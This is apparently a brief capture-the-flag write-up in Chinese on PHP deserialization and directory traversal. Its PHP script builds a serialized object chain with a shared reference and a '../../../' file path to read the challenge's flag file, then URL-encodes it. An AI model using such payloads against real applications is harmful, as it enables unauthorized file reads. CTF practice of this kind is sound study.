# 知识点
反序列化<br />目录穿越
# 思路
```php
<?php  
    class acp 
    {   
        protected $cinder;  
        public $neutron='2';
        public $nova='1';
        function __construct($class) 
        {      
            $this->cinder = $class;
        }  
    }

    class ace
    {    
        public $filename;     
        public $docker;  
    }
    $b = new ace();
    $a = new acp($b);
    $a->nova = &$a->neutron;
    $b->filename = "../../../nssctfasdasdflag";
    $b->docker = serialize($a);
    echo urlencode(serialize($a));


```
